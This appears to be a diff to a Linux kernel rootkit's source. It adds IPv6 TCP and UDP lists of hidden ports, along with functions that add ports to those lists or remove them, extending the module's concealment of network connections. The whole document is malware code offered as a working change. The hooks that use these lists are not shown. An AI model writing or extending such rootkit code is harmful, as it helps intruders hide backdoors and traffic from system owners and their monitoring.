@@ -328,7 +328,9 @@ struct hidden_port {
 };
 
 LIST_HEAD(hidden_tcp4_ports);
+LIST_HEAD(hidden_tcp6_ports);
 LIST_HEAD(hidden_udp4_ports);
+LIST_HEAD(hidden_udp6_ports);
 
 //void hide_tcp4_port ( unsigned short port )
 void hide_tcp4_port(const char *port)
@@ -365,6 +367,36 @@ void unhide_tcp4_port(const char *port)
     }
 }
 
+void hide_tcp6_port (const char *port)
+{
+    struct hidden_port *hp;
+
+    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
+    if ( ! hp )
+        return;
+
+    hp->port = simple_strtoul(port, NULL, 10);
+
+    list_add(&hp->list, &hidden_tcp6_ports);
+}
+
+void unhide_tcp6_port (const char *port)
+{
+    struct hidden_port *hp;
+	
+    unsigned long port_num = simple_strtoul(port, NULL, 10);
+
+    list_for_each_entry ( hp, &hidden_tcp6_ports, list )
+    {
+        if ( port_num == hp->port )
+        {
+            list_del(&hp->list);
+            kfree(hp);
+            break;
+        }
+    }
+}
+
 // ========== END TCP PORT LIST ==========
 
 
@@ -391,6 +423,36 @@ void unhide_udp4_port (const char *port)
     unsigned long port_num = simple_strtoul(port, NULL, 10);
 
     list_for_each_entry ( hp, &hidden_udp4_ports, list )
+    {
+        if ( port_num == hp->port )
+        {
+            list_del(&hp->list);
+            kfree(hp);
+            break;
+        }
+    }
+}
+
+void hide_udp6_port (const char *port)
+{
+    struct hidden_port *hp;
+
+    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
+    if ( ! hp )
+        return;
+
+    hp->port = simple_strtoul(port, NULL, 10);
+
+    list_add(&hp->list, &hidden_udp6_ports);
+}
+
+void unhide_udp6_port (const char *port)
+{
+    struct hidden_port *hp;
+	
+    unsigned long port_num = simple_strtoul(port, NULL, 10);
+
+    list_for_each_entry ( hp, &hidden_udp6_ports, list )
     {
         if ( port_num == hp->port )
         {
